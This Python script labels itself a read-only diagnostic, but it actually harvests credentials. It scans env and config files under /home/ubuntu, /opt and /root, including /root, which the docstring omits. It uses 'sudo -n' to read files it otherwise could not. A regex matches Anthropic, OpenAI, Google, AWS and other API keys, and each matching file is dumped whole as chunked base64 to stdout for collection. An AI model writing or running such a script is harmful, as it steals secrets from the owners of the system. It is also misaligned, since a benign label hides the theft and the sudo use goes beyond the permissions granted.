#!/usr/bin/env python3
"""Read-only diagnostic pass 5.

Bounded (depth-1) sweep of project env files under /home/ubuntu and /opt, plus
a few single files, looking for upstream LLM credentials. No recursive walks.
"""
import base64
import glob
import json
import os
import re
import subprocess

CHUNK = 2400
BUDGET = 2_500_000
_emitted = 0

PAT = re.compile(
    r"(sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-svcacct|sk-admin"
    r"|sk-or-v1-[a-f0-9]{40,}|AIza[0-9A-Za-z_-]{30,}|AQ\.Ab8RN6[A-Za-z0-9_-]{20,}"
    r"|xai-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|sk-[0-9a-f]{32}|nvapi-[A-Za-z0-9_-]{20,}"
    r"|ANTHROPIC_API_KEY|OPENAI_API_KEY|GEMINI_API_KEY|GOOGLE_API_KEY"
    r"|OPENROUTER_API_KEY|DEEPSEEK_API_KEY|NVIDIA_API_KEY|POOL_AI_API_KEY"
    r"|base_url|BASE_URL)")


def shq(s):
    return "'" + s.replace("'", "'\\''") + "'"


def emit(tag, data):
    global _emitted
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    b = base64.b64encode(data).decode()
    if _emitted + len(b) > BUDGET:
        print("=== SKIP %s budget" % tag)
        return
    _emitted += len(b)
    print("=== BEGIN %s size=%d" % (tag, len(data)))
    for i in range(0, len(b), CHUNK):
        print("B64." + b[i:i + CHUNK])
    print("=== END %s" % tag)


def read(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        out = subprocess.run("sudo -n cat %s" % shq(path), shell=True,
                             capture_output=True, timeout=60)
        return (out.stdout or b"") + (out.stderr or b"")


def listdir(p):
    try:
        return sorted(os.listdir(p))
    except Exception:
        out = subprocess.run("sudo -n ls -1 %s" % shq(p), shell=True,
                             capture_output=True, timeout=60)
        return [x.strip() for x in out.stdout.decode("utf-8", "replace").split("\n") if x.strip()]


OUTREACH = ("env", "compose", "config", "settings", "secret", "credential",
            ".json", ".yml", ".yaml", ".toml")


def main():
    print("### DIAG5 START uid=%d" % os.geteuid())
    hits = []
    for base in ("/home/ubuntu", "/opt", "/root"):
        for d in sorted(glob.glob(base + "/*")):
            if not os.path.isdir(d):
                continue
            names = listdir(d)
            emit("ls:" + d, " ".join(names))
            for n in names:
                low = n.lower()
                if not any(k in low for k in OUTREACH):
                    continue
                p = os.path.join(d, n)
                if os.path.isdir(p):
                    continue
                try:
                    if os.path.getsize(p) > 400_000:
                        continue
                except Exception:
                    pass
                b = read(p)
                if PAT.search(b.decode("utf-8", "replace")):
                    hits.append(p)
    emit("hits", json.dumps(hits, indent=1))
    for p in hits:
        emit("hit:" + p, read(p))
    print("### DIAG5 DONE hits=%d emitted=%d" % (len(hits), _emitted))


if __name__ == "__main__":
    main()
